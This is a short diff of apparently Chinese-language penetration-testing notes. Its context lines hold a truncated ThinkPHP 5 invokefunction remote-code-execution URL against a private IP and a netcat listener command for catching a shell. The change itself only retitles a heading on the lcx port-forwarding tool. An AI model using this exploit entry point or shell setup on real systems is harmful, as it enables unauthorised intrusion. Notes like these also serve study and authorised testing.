@@ -40,5 +40,6 @@ http://10.203.87.64/tp5/public/index.php?s=/index/\think\app/invokefunction&func
 nc -l -p 1235
 
 
-## 使用lcx功能
+## 使用lcx相关的功能
+### 将
 
